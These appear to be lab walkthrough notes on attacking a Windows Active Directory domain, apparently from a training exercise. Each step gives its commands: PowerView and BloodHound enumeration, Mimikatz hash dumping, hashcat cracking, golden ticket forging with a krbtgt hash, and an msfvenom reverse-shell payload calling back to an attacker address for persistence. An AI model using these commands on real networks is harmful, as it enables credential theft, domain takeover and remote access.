```
IP = 10.10.68.244
```

## Enumeration with PowerView & Bloodhound
--------------------------------------------
+ Connected to victim using SSH, `ssh -l user@qualified.domain IP`
+ Start powershell using `powershell -ep bypass`
+ Start PowerView: `. .\Downloads\PowerView.ps1`
+ Enumerate domain users: `Get-NetUser | select cn`
+ Enumerate domain groups: `Get-NetGroup -GroupName *admin*`
+ Obtained enumeration data using `SharpHound.ps1` and `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFilename loot.zip`
+ Imported the loot.zip file into bloodhound on the attacker machine.

## Dumping hashes with Mimikatz
-------------------------------------
+ Ran `mimikatz.exe` on victim machine.
+ Check privileges using `privilege::debug`
+ Dump hashes: `lsadump::lsa /patch`
+ Crack hashes: `hashcat -m 1000 <hash> rockyou.txt`

## Golden ticket attacks with mimimatz
----------------------------------------
+ Dump hash & identifier of Kerberos Ticket Granting Ticket: `lsadump::lsa /inject /name:krbtgt`
+ Create a golden ticket: `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500`
+ Use the golden ticket to access other machines: `misc::cmd`

## Enumeration with Server Manager
-------------------------------------
+ A lot of enumeration can be done using the tools and manage tab of the server manager.

## Maintaining access
------------------------------
+ Generate a payload using msfvenom: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.6.27.197 LPORT=9001 --format exe -o payload.exe`
+ Transfer payload to victim and start listening on 9001 on attacker machine using `use exploit/multi/handler`.
+ Execute binary in victim to get a meterpreter shell back.
+ Alternatively, use the persistence module to create a backdoor into victim computer.
